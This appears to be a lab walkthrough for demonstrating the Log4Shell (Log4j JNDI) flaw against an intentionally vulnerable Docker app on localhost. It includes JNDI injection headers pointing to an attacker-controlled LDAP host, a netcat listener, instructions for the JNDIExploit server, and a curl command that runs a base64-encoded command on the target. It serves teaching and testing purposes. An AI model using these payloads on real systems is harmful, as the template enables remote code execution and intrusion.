# Log4J-Demo

## What is Log4J? 

- A logging tool, written in Java, that is commonly used in many applications across the internet

## Setting Up Environment

First get the vulnerable docker and run it using [^1]: 

```sh
docker pull ghcr.io/christophetd/log4shell-vulnerable-app:latest
docker run --name vulnerable-app --rm -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929
```

## Finding the Exploit 

The docker container will now be running on `localhost:8080`. Go there in *BurpSuit* and send the `GET` request to the repeter. The request should look something like this: 

```http
GET / HTTP/1.1
Host: localhost:8080
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="107", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

Now we are going to see if the server is vulnerable to *Log4J*. First try changing the `HTTP` headers to the following `JNDI` command:

```
${jndi:ldaps//YOUR_IP:553}
```

We are now going to start listening on our local machine using *Netcat* to see if any of these headers worked: 

```sh
nc -lvnp 553
```

The `GET` request should now look something like this: 

```http
GET / HTTP/1.1
Host: localhost:8080
Cache-Control: ${jndi:ldaps//YOUR_IP:553}
sec-ch-ua: ${jndi:ldaps//YOUR_IP:553}
sec-ch-ua-mobile: ${jndi:ldaps//YOUR_IP:553}
sec-ch-ua-platform: ${jndi:ldaps//YOUR_IP:553}
Upgrade-Insecure-Requests: ${jndi:ldaps//YOUR_IP:553}
User-Agent: ${jndi:ldaps//YOUR_IP:553}
Accept: ${jndi:ldaps//YOUR_IP:553}
Sec-Fetch-Site: ${jndi:ldaps//YOUR_IP:553}
Sec-Fetch-Mode: ${jndi:ldaps//YOUR_IP:553}
Sec-Fetch-User: ${jndi:ldaps//YOUR_IP:553}
Sec-Fetch-Dest: ${jndi:ldaps//YOUR_IP:553}
Accept-Encoding: ${jndi:ldaps//YOUR_IP:553}
Accept-Language: ${jndi:ldaps//YOUR_IP:553}
Connection: close
```

> **NOTE:** you will need to put in the `JNDI` request one by one to see which `HTTP` header is vulnerable. 

None of these `HTTP` headers are vulnerable, you can now try putting in new one to see if any of those are vulnerable. This server happens to have a *Log4J* vulnerablility on the `X-Api-Version` header. 

If you put the following response in the `HTTP` request, you should get a response in *Netcat*: 

```http
X-Api-Version: ${jndi:ldaps//YOUR_IP:553}
```

This tells you that the server is vulnerable to the exploit. 

## Exploitation 

We will be using a tool called [JNDIExploit](http://web.archive.org/web/20211211031401/https://objects.githubusercontent.com/github-production-release-asset-2e65be/314785055/a6f05000-9563-11eb-9a61-aa85eca37c76?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211211T031401Z&X-Amz-Expires=300&X-Amz-Signature=140e57e1827c6f42275aa5cb706fdff6dc6a02f69ef41e73769ea749db582ce0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=314785055&response-content-disposition=attachment%3B%20filename%3DJNDIExploit.v1.2.zip&response-content-type=application%2Foctet-stream) to exploit the server. This program contains a "`LDAP` & `HTTP` servers for exploiting insecure-by-default `Java JNDI API`". There is a `JAR` file provided in this repo called `LDAP-Server.jar` to run it, use the following command as a template to run the `LDAP` server: 

```sh
java -jar LDAP-Server.jar -i YOUR_IP -p 8888
```

Once you start the `LDAP` server, we need to create a command to exploit the server. We will use the following as as a template: 

```http
X-Api-Version: ${jndi:ldap://LDAP_SERVER_IP:1389/Basic/Command/COMMAND_TO_EXECUTE_URL_ENCODED} 
```

For example the following command will add a file called `pwned` to the `/tmp` directory: 

```sh
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://LDAP_SERVER_IP:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```

> **NOTE:** This can also be used *BurpSuite* by adding the following line to the origal reqest: 
> ```http
> curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
> ```


## Sources  

- https://github.com/NCSC-NL/log4shell

[^1]: [Docker container created by christophetd](https://github.com/christophetd/log4shell-vulnerabre-app) 
